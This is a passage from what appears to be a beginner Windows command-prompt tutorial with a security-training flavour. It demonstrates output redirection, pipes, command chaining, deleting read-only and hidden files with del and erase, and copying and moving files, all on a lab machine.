
<span class="hljs-number">06</span>/<span class="hljs-number">23</span>/<span class="hljs-number">2021</span>  <span class="hljs-number">02</span>:<span class="hljs-number">44</span> PM    &lt;DIR&gt;          .
<span class="hljs-number">06</span>/<span class="hljs-number">23</span>/<span class="hljs-number">2021</span>  <span class="hljs-number">02</span>:<span class="hljs-number">44</span> PM    &lt;DIR&gt;          ..
<span class="hljs-number">06</span>/<span class="hljs-number">21</span>/<span class="hljs-number">2021</span>  <span class="hljs-number">10</span>:<span class="hljs-number">38</span> PM    &lt;DIR&gt;          Backup
<span class="hljs-number">06</span>/<span class="hljs-number">14</span>/<span class="hljs-number">2021</span>  <span class="hljs-number">10</span>:<span class="hljs-number">34</span> PM                <span class="hljs-number">97</span> Project plans<span class="hljs-selector-class">.txt</span>
<span class="hljs-number">06</span>/<span class="hljs-number">14</span>/<span class="hljs-number">2021</span>  <span class="hljs-number">08</span>:<span class="hljs-number">38</span> PM               <span class="hljs-number">114</span> secrets<span class="hljs-selector-class">.txt</span>
               <span class="hljs-number">2</span> File(s)            <span class="hljs-number">211</span> bytes
               <span class="hljs-number">3</span> Dir(s)  <span class="hljs-number">39</span>,<span class="hljs-number">028</span>,<span class="hljs-number">850</span>,<span class="hljs-number">688</span> bytes free

C:\Users\htb\Documents&gt;ipconfig /all &gt; <span class="hljs-selector-tag">details</span><span class="hljs-selector-class">.txt</span>

C:\Users\htb\Documents&gt;dir
 Volume <span class="hljs-keyword">in</span> drive C has no <span class="hljs-selector-tag">label</span>.
 Volume Serial Number is <span class="hljs-number">26</span>E7-<span class="hljs-number">9</span>EE4

 Directory of C:\Users\htb\Documents

<span class="hljs-number">06</span>/<span class="hljs-number">23</span>/<span class="hljs-number">2021</span>  <span class="hljs-number">02</span>:<span class="hljs-number">44</span> PM    &lt;DIR&gt;          .
<span class="hljs-number">06</span>/<span class="hljs-number">23</span>/<span class="hljs-number">2021</span>  <span class="hljs-number">02</span>:<span class="hljs-number">44</span> PM    &lt;DIR&gt;          ..
<span class="hljs-number">06</span>/<span class="hljs-number">21</span>/<span class="hljs-number">2021</span>  <span class="hljs-number">10</span>:<span class="hljs-number">38</span> PM    &lt;DIR&gt;          Backup
<span class="hljs-number">06</span>/<span class="hljs-number">23</span>/<span class="hljs-number">2021</span>  <span class="hljs-number">02</span>:<span class="hljs-number">44</span> PM             <span class="hljs-number">1</span>,<span class="hljs-number">813</span> <span class="hljs-selector-tag">details</span><span class="hljs-selector-class">.txt</span>
<span class="hljs-number">06</span>/<span class="hljs-number">14</span>/<span class="hljs-number">2021</span>  <span class="hljs-number">10</span>:<span class="hljs-number">34</span> PM                <span class="hljs-number">97</span> Project plans<span class="hljs-selector-class">.txt</span>
<span class="hljs-number">06</span>/<span class="hljs-number">14</span>/<span class="hljs-number">2021</span>  <span class="hljs-number">08</span>:<span class="hljs-number">38</span> PM               <span class="hljs-number">114</span> secrets<span class="hljs-selector-class">.txt</span>
               <span class="hljs-number">3</span> File(s)          <span class="hljs-number">2</span>,<span class="hljs-number">024</span> bytes
               <span class="hljs-number">3</span> Dir(s)  <span class="hljs-number">39</span>,<span class="hljs-number">028</span>,<span class="hljs-number">760</span>,<span class="hljs-number">576</span> bytes free

C:\Users\htb\Documents&gt;type <span class="hljs-selector-tag">details</span><span class="hljs-selector-class">.txt</span>

Windows IP Configuration

   Host Name . . . . . . . . . . . . : DESKTOP-LSM3BSF
   Primary Dns Suffix  . . . . . . . :
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No
   DNS Suffix Search List. . . . . . : greenhorn<span class="hljs-selector-class">.corp</span>

Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : greenhorn<span class="hljs-selector-class">.corp</span>
   Description . . . . . . . . . . . : Intel(R) <span class="hljs-number">82574</span>L Gigabit Network Connection
   Physical Address. . . . . . . . . : <span class="hljs-number">00</span>-<span class="hljs-number">0</span>C-<span class="hljs-number">29</span>-D7-<span class="hljs-number">67</span>-BF
   DHCP Enabled. . . . . . . . . . . : Yes
   Autoconfiguration Enabled . . . . : Yes
   Link-local IPv6 Address . . . . . : fe80::<span class="hljs-number">59</span>fe:<span class="hljs-number">9</span>ed2:fea6:<span class="hljs-number">1371%</span><span class="hljs-number">8</span>(Preferred)
   IPv4 Address. . . . . . . . . . . : <span class="hljs-number">172.16</span>.<span class="hljs-number">146.5</span>(Preferred)
   Subnet Mask . . . . . . . . . . . : <span class="hljs-number">255.255</span>.<span class="hljs-number">255.0</span>
   Lease Obtained. . . . . . . . . . : Wednesday, June <span class="hljs-number">23</span>, <span class="hljs-number">2021</span> <span class="hljs-number">2</span>:<span class="hljs-number">42</span>:<span class="hljs-number">19</span> PM
   Lease Expires . . . . . . . . . . : Thursday, June <span class="hljs-number">24</span>, <span class="hljs-number">2021</span> <span class="hljs-number">2</span>:<span class="hljs-number">27</span>:<span class="hljs-number">59</span> PM
   Default Gateway . . . . . . . . . : <span class="hljs-number">172.16</span>.<span class="hljs-number">146.1</span>
</code></pre>
<p>Looking above, we can see that the output from our <code>ipconfig /all</code> command was pushed to details.txt. When we check the file, we see when it was created, and the content&#39;s output successfully inside. Using <code>&gt;</code> this way will create the file if it does not exist, or it will overwrite the specified file&#39;s contents. To append to an already populated file, we can utilize <code>&gt;&gt;</code>.</p>
<p><strong>Append to a File</strong></p>
<p>Working with Directories and Files</p>
<pre><code class="lang-cmd-session">C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\h</span>tb<span class="hljs-symbol">\D</span>ocuments&gt; echo a b c d e &gt; test.txt

C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\h</span>tb<span class="hljs-symbol">\D</span>ocuments&gt;type test.txt
a b c d e

C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\h</span>tb<span class="hljs-symbol">\D</span>ocuments&gt;echo f g h i j k see how this works now? &gt;&gt; test.txt

C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\h</span>tb<span class="hljs-symbol">\D</span>ocuments&gt;type test.txt
a b c d e
f g h i j k see how this works now?
</code></pre>
<p>We created the test.txt file with a string, then appended our following line (f g h i j k see how this works now?) to the file with <code>&gt;&gt;</code>. We were feeding input from a command out before; let us feed input into a command now. We will accomplish that with <code>&lt;</code>.</p>
<p><strong>Pass in a Text File to a Command</strong></p>
<p>Working with Directories and Files</p>
<pre><code class="lang-cmd-session">C:\Users\htb\Documents&gt;<span class="hljs-built_in">find</span> /i <span class="hljs-string">"see"</span> &lt; test.txt

f g h i j k see how <span class="hljs-keyword">this</span> works now?
</code></pre>
<p>In the session above, we took the contents of <code>test.txt</code> and fed it into our find command. In this way, we were searching for the string <code>see</code>. We can see it kicked back the results by showing us the line where it found <code>see</code>. These were fairly simple commands, but remember that we can use <code>&lt;</code> like this to search for keywords or strings in large text files, sort for unique items, and much more. This can be extremely helpful for us as a hacker looking for key information. Another route we can take is to feed the output from a command directly into another command with the <code>|</code> called pipe.</p>
<p><strong>Pipe Output Between Commands</strong></p>
<p>Working with Directories and Files</p>
<pre><code class="lang-cmd-session">C:\Users\htb\Documents&gt;ipconfig /<span class="hljs-keyword">all</span> | find /i <span class="hljs-string">"IPV4"</span>

   IPv4 Address. . . . . . . . . . . : 172.16.146.5(<span class="hljs-type">Preferred</span>)
</code></pre>
<p>With <code>pipe</code>, we could issue the command <code>ipconfig /all</code> and send it to <code>find</code> to search for a specific string. We know it worked because it returns our result in the following line. This effectively took our console output and redirected it to a new pipe. If you get this concept down, you can do endless things.</p>
<p>Let us say we wish to have two commands executed in succession. We can issue the command and follow it with <code>&amp;</code> and then our next command. This will ensure that in this instance, our command <code>A</code> runs first then the session will run command <code>B</code>. It does not care if the command succeeded or failed. It just issues them.</p>
<p><strong>Run A Then B</strong></p>
<p>Working with Directories and Files</p>
<pre><code class="lang-cmd-session">C:\Users\htb\Documents&gt;ping <span class="hljs-number">8.8</span>.<span class="hljs-number">8.8</span> &amp; type test.txt

Pinging <span class="hljs-number">8.8</span>.<span class="hljs-number">8.8</span> <span class="hljs-keyword">with</span> <span class="hljs-number">32</span> bytes of data:
Reply from <span class="hljs-number">8.8</span>.<span class="hljs-number">8.8</span>: <span class="hljs-attr">bytes=32</span> <span class="hljs-attr">time=22ms</span> <span class="hljs-attr">TTL=114</span>
Reply from <span class="hljs-number">8.8</span>.<span class="hljs-number">8.8</span>: <span class="hljs-attr">bytes=32</span> <span class="hljs-attr">time=19ms</span> <span class="hljs-attr">TTL=114</span>
Reply from <span class="hljs-number">8.8</span>.<span class="hljs-number">8.8</span>: <span class="hljs-attr">bytes=32</span> <span class="hljs-attr">time=17ms</span> <span class="hljs-attr">TTL=114</span>
Reply from <span class="hljs-number">8.8</span>.<span class="hljs-number">8.8</span>: <span class="hljs-attr">bytes=32</span> <span class="hljs-attr">time=16ms</span> <span class="hljs-attr">TTL=114</span>

Ping statistics for <span class="hljs-number">8.8</span>.<span class="hljs-number">8.8</span>:
    Packets: <span class="hljs-attr">Sent</span> = <span class="hljs-number">4</span>, <span class="hljs-attr">Received</span> = <span class="hljs-number">4</span>, <span class="hljs-attr">Lost</span> = <span class="hljs-number">0</span> (<span class="hljs-number">0</span>% loss),
Approximate round trip times <span class="hljs-keyword">in</span> milli-seconds:
    <span class="hljs-attr">Minimum</span> = <span class="hljs-number">16</span>ms, <span class="hljs-attr">Maximum</span> = <span class="hljs-number">22</span>ms, <span class="hljs-attr">Average</span> = <span class="hljs-number">18</span>ms
a b c d e
f g h i j k see how this works now?
</code></pre>
<p>If we care about the result or state of the commands being run, we can utilize <code>&amp;&amp;</code> to say run command A, and if it succeeds, run command B. This can be useful if you are doing something that is results dependent such as our cmd-session below.</p>
<p><strong>State Dependent &amp;&amp;</strong></p>
<p>Working with Directories and Files</p>
<pre><code class="lang-cmd-session">C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\s</span>tudent<span class="hljs-symbol">\D</span>ocuments&gt;cd C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\s</span>tudent<span class="hljs-symbol">\D</span>ocuments<span class="hljs-symbol">\B</span>ackup &amp;&amp; echo 'did this work' &gt; yes.txt

C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\s</span>tudent<span class="hljs-symbol">\D</span>ocuments<span class="hljs-symbol">\B</span>ackup&gt;type yes.txt
'did this work'
</code></pre>
<p>We can see that on my first line with <code>&amp;&amp;</code>, we asked to change our working directory, then echo a string into a file if it succeeded. We can tell it succeeded because our cmd path changed and when we <code>type</code> the file, it echo&#39;d our string into the file. You can also accomplish the opposite of this with <code>||</code>. By using (pipe pipe), we are saying run command A. If it fails, run command B.</p>
<p>We have spent much time leveling up our file creation and modification skills. Now, what if we want to remove objects from the host? Let us look at the <code>del</code> and <code>erase</code> commands.</p>
<h4 id="deleting-files">Deleting Files</h4>
<p><strong>Dynamic Del And Erase</strong></p>
<p>Working with Directories and Files</p>
<pre><code class="lang-cmd-session">C:\Users\htb\Desktop\example&gt; dir

 Volume in drive C has no label.
 Volume Serial Number is <span class="hljs-number">26</span>E7-<span class="hljs-number">9</span>EE4

 Directory of C:\Users\htb\Desktop\example

<span class="hljs-number">06</span><span class="hljs-regexp">/16/</span><span class="hljs-number">2021</span>  <span class="hljs-number">02</span>:<span class="hljs-number">00</span> PM    &lt;DIR&gt;          .
<span class="hljs-number">06</span><span class="hljs-regexp">/16/</span><span class="hljs-number">2021</span>  <span class="hljs-number">02</span>:<span class="hljs-number">00</span> PM    &lt;DIR&gt;          ..
<span class="hljs-number">06</span><span class="hljs-regexp">/16/</span><span class="hljs-number">2021</span>  <span class="hljs-number">02</span>:<span class="hljs-number">00</span> PM                 <span class="hljs-number">5</span> <span class="hljs-keyword">file</span>-<span class="hljs-number">1</span>
<span class="hljs-number">06</span><span class="hljs-regexp">/16/</span><span class="hljs-number">2021</span>  <span class="hljs-number">02</span>:<span class="hljs-number">00</span> PM                 <span class="hljs-number">5</span> <span class="hljs-keyword">file</span>-<span class="hljs-number">2</span>
<span class="hljs-number">06</span><span class="hljs-regexp">/16/</span><span class="hljs-number">2021</span>  <span class="hljs-number">02</span>:<span class="hljs-number">00</span> PM                 <span class="hljs-number">5</span> <span class="hljs-keyword">file</span>-<span class="hljs-number">3</span>
<span class="hljs-number">06</span><span class="hljs-regexp">/16/</span><span class="hljs-number">2021</span>  <span class="hljs-number">02</span>:<span class="hljs-number">00</span> PM                 <span class="hljs-number">5</span> <span class="hljs-keyword">file</span>-<span class="hljs-number">4</span>
<span class="hljs-number">06</span><span class="hljs-regexp">/16/</span><span class="hljs-number">2021</span>  <span class="hljs-number">02</span>:<span class="hljs-number">00</span> PM                 <span class="hljs-number">5</span> <span class="hljs-keyword">file</span>-<span class="hljs-number">5</span>
<span class="hljs-number">06</span><span class="hljs-regexp">/16/</span><span class="hljs-number">2021</span>  <span class="hljs-number">02</span>:<span class="hljs-number">00</span> PM                 <span class="hljs-number">5</span> <span class="hljs-keyword">file</span>-<span class="hljs-number">6</span>
<span class="hljs-number">06</span><span class="hljs-regexp">/16/</span><span class="hljs-number">2021</span>  <span class="hljs-number">02</span>:<span class="hljs-number">00</span> PM                 <span class="hljs-number">5</span> <span class="hljs-keyword">file</span>-<span class="hljs-number">66</span>
               <span class="hljs-number">7</span> <span class="hljs-keyword">File</span>(s)             <span class="hljs-number">35</span> bytes
               <span class="hljs-number">2</span> Dir(s)  <span class="hljs-number">38</span>,<span class="hljs-number">633</span>,<span class="hljs-number">730</span>,<span class="hljs-number">048</span> bytes free

C:\Users\htb\Desktop\example&gt;del <span class="hljs-keyword">file</span>-<span class="hljs-number">1</span>

C:\Users\htb\Desktop\example&gt;dir
 Volume in drive C has no label.
 Volume Serial Number is <span class="hljs-number">26</span>E7-<span class="hljs-number">9</span>EE4

 Directory of C:\Users\htb\Desktop\example

<span class="hljs-number">06</span><span class="hljs-regexp">/16/</span><span class="hljs-number">2021</span>  <span class="hljs-number">02</span>:<span class="hljs-number">03</span> PM    &lt;DIR&gt;          .
<span class="hljs-number">06</span><span class="hljs-regexp">/16/</span><span class="hljs-number">2021</span>  <span class="hljs-number">02</span>:<span class="hljs-number">03</span> PM    &lt;DIR&gt;          ..
<span class="hljs-number">06</span><span class="hljs-regexp">/16/</span><span class="hljs-number">2021</span>  <span class="hljs-number">02</span>:<span class="hljs-number">00</span> PM                 <span class="hljs-number">5</span> <span class="hljs-keyword">file</span>-<span class="hljs-number">2</span>
<span class="hljs-number">06</span><span class="hljs-regexp">/16/</span><span class="hljs-number">2021</span>  <span class="hljs-number">02</span>:<span class="hljs-number">00</span> PM                 <span class="hljs-number">5</span> <span class="hljs-keyword">file</span>-<span class="hljs-number">3</span>
<span class="hljs-number">06</span><span class="hljs-regexp">/16/</span><span class="hljs-number">2021</span>  <span class="hljs-number">02</span>:<span class="hljs-number">00</span> PM                 <span class="hljs-number">5</span> <span class="hljs-keyword">file</span>-<span class="hljs-number">4</span>
<span class="hljs-number">06</span><span class="hljs-regexp">/16/</span><span class="hljs-number">2021</span>  <span class="hljs-number">02</span>:<span class="hljs-number">00</span> PM                 <span class="hljs-number">5</span> <span class="hljs-keyword">file</span>-<span class="hljs-number">5</span>
<span class="hljs-number">06</span><span class="hljs-regexp">/16/</span><span class="hljs-number">2021</span>  <span class="hljs-number">02</span>:<span class="hljs-number">00</span> PM                 <span class="hljs-number">5</span> <span class="hljs-keyword">file</span>-<span class="hljs-number">6</span>
<span class="hljs-number">06</span><span class="hljs-regexp">/16/</span><span class="hljs-number">2021</span>  <span class="hljs-number">02</span>:<span class="hljs-number">00</span> PM                 <span class="hljs-number">5</span> <span class="hljs-keyword">file</span>-<span class="hljs-number">66</span>
               <span class="hljs-number">6</span> <span class="hljs-keyword">File</span>(s)             <span class="hljs-number">30</span> bytes
               <span class="hljs-number">2</span> Dir(s)  <span class="hljs-number">38</span>,<span class="hljs-number">633</span>,<span class="hljs-number">730</span>,<span class="hljs-number">048</span> bytes free
</code></pre>
<p>When utilizing <code>del</code> or <code>erase</code>, remember that we can specify a directory, a filename, a list of names, or even a specific attribute to target when trying to delete files. Above, we listed the example directory and then deleted <code>file-1</code>. Simple enough, right? Now let us erase a list of files.</p>
<p><strong>Using Del And Erase to remove a list of files</strong></p>
<p>Working with Directories and Files</p>
<pre><code class="lang-cmd-session">C:\Users\htb\Desktop\example&gt; <span class="hljs-keyword">erase</span> <span class="hljs-keyword">file</span>-3 <span class="hljs-keyword">file</span>-5

<span class="hljs-keyword">dir</span>
 Volume <span class="hljs-keyword">in</span> drive C has <span class="hljs-keyword">no</span> <span class="hljs-keyword">label</span>.
 Volume Serial Number is 26E7-9EE4

 Directory of C:\Users\htb\Desktop\example

06/16/2021  02:06 PM    &lt;<span class="hljs-keyword">DIR</span>&gt;          .
06/16/2021  02:06 PM    &lt;<span class="hljs-keyword">DIR</span>&gt;          ..
06/16/2021  02:00 PM                 5 <span class="hljs-keyword">file</span>-2
06/16/2021  02:00 PM                 5 <span class="hljs-keyword">file</span>-4
06/16/2021  02:00 PM                 5 <span class="hljs-keyword">file</span>-6
06/16/2021  02:00 PM                 5 <span class="hljs-keyword">file</span>-66
               4 <span class="hljs-keyword">File</span>(s)             20 bytes
               2 <span class="hljs-keyword">Dir</span>(s)  38,633,218,048 bytes free
</code></pre>
<p>We can see in the session above that we utilized erase instead of del this time. This was to show the interoperability of both commands. Think of them as symbolic links. Both commands do the same thing. This time we fed erase a list of two files, <code>file-3</code> and <code>file-5</code>. It erased the files without issue.</p>
<p>Let us say we want to get rid of a read-only or hidden file. We can do that with the <code>/A:</code> switch. /A can delete files based on a specific attribute. Let us look at the help for del quickly and see what those attributes are.</p>
<h4 id="del-help-documentation">Del Help Documentation</h4>
<p>Working with Directories and Files</p>
<pre><code class="lang-cmd-session">C:\Users\htb\Desktop\example&gt; help del

Deletes <span class="hljs-literal">one</span> <span class="hljs-keyword">or</span> more <span class="hljs-built_in">files</span>.

DEL [/P] [/F] [/S] [/Q] [/A[[:]attributes]] names
ERASE [/P] [/F] [/S] [/Q] [/A[[:]attributes]] names

  names         Specifies <span class="hljs-keyword">a</span> list <span class="hljs-keyword">of</span> <span class="hljs-literal">one</span> <span class="hljs-keyword">or</span> more <span class="hljs-built_in">files</span> <span class="hljs-keyword">or</span> <span class="hljs-built_in">directories</span>.
                Wildcards may be used <span class="hljs-built_in">to</span> <span class="hljs-built_in">delete</span> multiple <span class="hljs-built_in">files</span>. If <span class="hljs-keyword">a</span>
                <span class="hljs-built_in">directory</span> is specified, all <span class="hljs-built_in">files</span> <span class="hljs-keyword">within</span> <span class="hljs-keyword">the</span> <span class="hljs-built_in">directory</span>
                will be deleted.

  /P            Prompts <span class="hljs-keyword">for</span> confirmation <span class="hljs-keyword">before</span> deleting <span class="hljs-keyword">each</span> <span class="hljs-built_in">file</span>.
  /F            Force deleting <span class="hljs-keyword">of</span> <span class="hljs-built_in">read</span>-only <span class="hljs-built_in">files</span>.
  /S            Delete specified <span class="hljs-built_in">files</span> <span class="hljs-built_in">from</span> all subdirectories.
  /Q            Quiet mode, <span class="hljs-built_in">do</span> <span class="hljs-keyword">not</span> ask <span class="hljs-keyword">if</span> ok <span class="hljs-built_in">to</span> <span class="hljs-built_in">delete</span> <span class="hljs-keyword">on</span> <span class="hljs-title">global</span> <span class="hljs-title">wildcard</span>
  /A            Selects <span class="hljs-built_in">files</span> <span class="hljs-built_in">to</span> <span class="hljs-built_in">delete</span> based <span class="hljs-keyword">on</span> <span class="hljs-title">attributes</span>
  attributes    R  Read-only <span class="hljs-built_in">files</span>            S  System <span class="hljs-built_in">files</span>
                H  Hidden <span class="hljs-built_in">files</span>               A  Files ready <span class="hljs-keyword">for</span> archiving
                I  Not content indexed Files  L  Reparse Points
                O  Offline <span class="hljs-built_in">files</span>              -  Prefix meaning <span class="hljs-keyword">not</span>
</code></pre>
<p>So, to delete a read-only file, we can use <code>A:R</code>. This will remove anything within our path that is Read-only. However, how do we identify if a file is read-only, hidden, or has some other attribute? Dir can come to the rescue again. Utilizing <code>dir /A:R</code> will show us anything with the Read-only attribute. Let us give it a try.</p>
<p><strong>View Files With the Read-only Attribute</strong></p>
<p>Working with Directories and Files</p>
<pre><code class="lang-cmd-session">C:\Users\htb\Desktop\example&gt; <span class="hljs-keyword">dir</span> /A:<span class="hljs-built_in">R</span>

 Volume <span class="hljs-keyword">in</span> drive C has <span class="hljs-keyword">no</span> <span class="hljs-keyword">label</span>.
 Volume Serial Number is 26E7-9EE4

 Directory of C:\Users\htb\Desktop\example

06/16/2021  02:00 PM                 5 <span class="hljs-keyword">file</span>-66
               1 <span class="hljs-keyword">File</span>(s)              5 bytes
               0 <span class="hljs-keyword">Dir</span>(s)  38,632,652,800 bytes free
</code></pre>
<p>Now we know one file matches our Read-only attribute in the example directory. Let us delete it.</p>
<p><strong>Delete a Read-only File</strong></p>
<p>Working with Directories and Files</p>
<pre><code class="lang-cmd-session">C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\h</span>tb<span class="hljs-symbol">\D</span>esktop<span class="hljs-symbol">\e</span>xample &gt; del /A:R *

C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\h</span>tb<span class="hljs-symbol">\D</span>esktop<span class="hljs-symbol">\e</span>xample<span class="hljs-symbol">\*</span>, Are you sure (Y/N)? Y

C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\h</span>tb<span class="hljs-symbol">\D</span>esktop<span class="hljs-symbol">\e</span>xample&gt;dir
 Volume in drive C has no label.
 Volume Serial Number is 26E7-9EE4

 Directory of C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\h</span>tb<span class="hljs-symbol">\D</span>esktop<span class="hljs-symbol">\e</span>xample

06/16/2021  02:22 PM    &lt;DIR&gt;          .
06/16/2021  02:22 PM    &lt;DIR&gt;          ..
06/16/2021  02:00 PM                 5 file-2
06/16/2021  02:00 PM                 5 file-4
06/16/2021  02:00 PM                 5 file-6
               3 File(s)             15 bytes
               2 Dir(s)  38,632,529,920 bytes free
</code></pre>
<p>Notice that we used <code>*</code> to specify any file. Now when we look at the example directory again, file-66 is missing, but files 2, 4, and 6 are still there. Let us give del a swing again with the hidden attribute. To identify if there are any hidden files within the directory, we can use <code>dir /A:H</code></p>
<p><strong>Viewing Hidden Files</strong></p>
<p>Working with Directories and Files</p>
<pre><code class="lang-cmd-session">C:\Users\htb\Desktop\example&gt; <span class="hljs-keyword">dir</span> /A:<span class="hljs-built_in">H</span>
 Volume <span class="hljs-keyword">in</span> drive C has <span class="hljs-keyword">no</span> <span class="hljs-keyword">label</span>.
 Volume Serial Number is 26E7-9EE4

 Directory of C:\Users\htb\Desktop\example

06/16/2021  02:00 PM                 5 <span class="hljs-keyword">file</span>-99
               1 <span class="hljs-keyword">File</span>(s)              5 bytes
               0 <span class="hljs-keyword">Dir</span>(s)  38,632,202,240 bytes free
</code></pre>
<p>Notice the new file we did not see before? Now <code>file-99</code> is showing up in our directory listing hidden files. Remember that much like Linux, you can hide files from the view of users. With the hidden attribute, the file exists and can be called, but it will not be visible within a directory listing or from the GUI unless specifically looking for them. To delete the hidden file, we can perform the same del command as earlier, just changing the attribute from <code>R</code> to <code>H</code>.</p>
<p><strong>Removing Hidden Files</strong></p>
<p>Working with Directories and Files</p>
<pre><code class="lang-cmd-session">C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\h</span>tb<span class="hljs-symbol">\D</span>esktop<span class="hljs-symbol">\e</span>xample&gt;dir /A:H
 Volume in drive C has no label.
 Volume Serial Number is 26E7-9EE4

 Directory of C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\h</span>tb<span class="hljs-symbol">\D</span>esktop<span class="hljs-symbol">\e</span>xample

06/16/2021  02:00 PM                 5 file-99
               1 File(s)              5 bytes
               0 Dir(s)  38,632,202,240 bytes free

C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\h</span>tb<span class="hljs-symbol">\D</span>esktop<span class="hljs-symbol">\e</span>xample&gt;del /A:H *
C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\h</span>tb<span class="hljs-symbol">\D</span>esktop<span class="hljs-symbol">\e</span>xample<span class="hljs-symbol">\*</span>, Are you sure (Y/N)? Y

C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\h</span>tb<span class="hljs-symbol">\D</span>esktop<span class="hljs-symbol">\e</span>xample&gt;dir
 Volume in drive C has no label.
 Volume Serial Number is 26E7-9EE4

 Directory of C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\h</span>tb<span class="hljs-symbol">\D</span>esktop<span class="hljs-symbol">\e</span>xample

06/16/2021  02:28 PM    &lt;DIR&gt;          .
06/16/2021  02:28 PM    &lt;DIR&gt;          ..
06/16/2021  02:00 PM                 5 file-2
06/16/2021  02:00 PM                 5 file-4
06/16/2021  02:00 PM                 5 file-6
               3 File(s)             15 bytes
               2 Dir(s)  38,631,997,440 bytes free

C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\h</span>tb<span class="hljs-symbol">\D</span>esktop<span class="hljs-symbol">\e</span>xample&gt;dir /A:H
 Volume in drive C has no label.
 Volume Serial Number is 26E7-9EE4

 Directory of C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\h</span>tb<span class="hljs-symbol">\D</span>esktop<span class="hljs-symbol">\e</span>xample

File Not Found
</code></pre>
<p>Now we successfully deleted a file with the hidden attribute. To erase the directory with the rest of its contents, we can feed the <code>del</code> command with the directory name to remove the contents and follow it up with the <code>rd</code> command to eliminate the directory structure. If a file resides within the directory with the Read-only attribute or some other, utilizing the <code>/F</code> switch will force delete the file.</p>
<h4 id="copying-and-moving-files">Copying and Moving Files</h4>
<p>Just like directories, we have several options to copy or move files. <code>Copy</code> and <code>move</code> are the easiest ways to accomplish this. We can use them to make copies of a file in the same directory or move it into another. As a task, this is one of the simplest we will do.</p>
<p><strong>copy</strong></p>
<p>Working with Directories and Files</p>
<pre><code class="lang-cmd-session">C:\Users\student\Documents\<span class="hljs-keyword">Backup</span>&gt;copy secrets.txt C:\<span class="hljs-keyword">Users</span>\student\Downloads\<span class="hljs-keyword">not</span>-secrets.txt

        <span class="hljs-number">1</span> <span class="hljs-keyword">file</span>(s) copied.
C:\<span class="hljs-keyword">Users</span>\student\Downloads&gt;dir
 Volume <span class="hljs-keyword">in</span> drive C has <span class="hljs-keyword">no</span> label.
 Volume <span class="hljs-built_in">Serial</span> <span class="hljs-built_in">Number</span> <span class="hljs-keyword">is</span> <span class="hljs-number">26E7</span><span class="hljs-number">-9</span>EE4

 <span class="hljs-keyword">Directory</span> <span class="hljs-keyword">of</span> C:\<span class="hljs-keyword">Users</span>\student\Downloads

<span class="hljs-number">06</span>/<span class="hljs-number">23</span>/<span class="hljs-number">2021</span>  <span class="hljs-number">10</span>:<span class="hljs-number">35</span> PM    &lt;DIR&gt;          .
<span class="hljs-number">06</span>/<span class="hljs-number">23</span>/<span class="hljs-number">2021</span>  <span class="hljs-number">10</span>:<span class="hljs-number">35</span> PM    &lt;DIR&gt;          ..
<span class="hljs-number">06</span>/<span class="hljs-number">21</span>/<span class="hljs-number">2021</span>  <span class="hljs-number">11</span>:<span class="hljs-number">58</span> PM             <span class="hljs-number">2</span>,<span class="hljs-number">418</span> <span class="hljs-keyword">not</span>-secrets.txt
               <span class="hljs-number">1</span> <span class="hljs-keyword">File</span>(s)          <span class="hljs-number">2</span>,<span class="hljs-number">418</span> <span class="hljs-keyword">bytes</span>
               <span class="hljs-number">2</span> Dir(s)  <span class="hljs-number">39</span>,<span class="hljs-number">021</span>,<span class="hljs-number">146</span>,<span class="hljs-number">112</span> <span class="hljs-keyword">bytes</span> free
</code></pre>
<p>In the example above, we copied <code>secrets.txt</code> and moved it to the Downloads folder, renamed it as <code>not-secrets.txt</code>. By default, <code>copy</code> will complete its task and close. If we wish to ensure the files copied are copied correctly, we can use the <code>/V</code> switch to turn on file validation.</p>
<p><strong>Copy Validation</strong></p>
<p>Working with Directories and Files</p>
<pre><code class="lang-cmd-session">C:<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\S</span>ystem32&gt; copy calc.exe C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\s</span>tudent<span class="hljs-symbol">\D</span>ownloads<span class="hljs-symbol">\c</span>opied-calc.exe /V
Overwrite C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\s</span>tudent<span class="hljs-symbol">\D</span>ownloads<span class="hljs-symbol">\c</span>opied-calc.exe? (Yes/No/All): A
        1 file(s) copied.
</code></pre>
<p>With <code>move</code>, we can move files and directories from one place to another and rename them. Move differs from copy because it can also rename and move directories.</p>
<p><strong>move</strong></p>
<p>Working with Directories and Files</p>
<pre><code class="lang-cmd-session">C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\s</span>tudent<span class="hljs-symbol">\D</span>esktop&gt;move C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\s</span>tudent<span class="hljs-symbol">\D</span>esktop<span class="hljs-symbol">\b</span>io.txt C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\s</span>tudent<span class="hljs-symbol">\D</span>ownloads

        1 file(s) moved.

C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\s</span>tudent<span class="hljs-symbol">\D</span>esktop&gt;dir C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\s</span>tudent<span class="hljs-symbol">\D</span>ownloads
 Volume in drive C has no label.
 Volume Serial Number is 26E7-9EE4

